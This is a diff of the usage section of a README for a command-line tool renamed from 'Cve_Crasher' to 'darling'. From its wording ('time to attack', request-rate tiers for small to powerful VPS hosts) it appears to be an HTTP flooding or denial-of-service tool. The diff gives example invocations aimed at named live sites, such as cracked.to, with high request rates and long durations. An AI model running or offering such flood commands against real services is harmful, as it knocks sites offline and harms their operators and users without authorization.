@@ -20,12 +20,12 @@
 
 			EXAMPLE
 =======================================================
-./Cve_Crasher -url http(s)://www.url.com/ -rqps 'request per second number' -duration 'time to attack' -timeout 'time between every request' -connection 'choose between 4 and 8 not more' -report report.json
+./darling -endpoint (URL) -requestsPerSecond (250 for small vps 500 for medium  and 999 for powerfull vps) -duration (TIME) -timeout (TIMOUT REQUEST(6000)) -maxRetry (20) -report report.json
 =======================================================
 
 		   EXAMPLE W/ LINK
 =======================================================
-./Cve_Crasher -url https://nextgen-down.io/ -rqps 9999 -duration 1200 -timeout 1 -connection 8 -report report.json
+./darling -endpoint https://cracked.to -requestsPerSecond 500 -duration 500 -timeout 6000 -maxRetry 20 -report report.json
 =======================================================
 
 
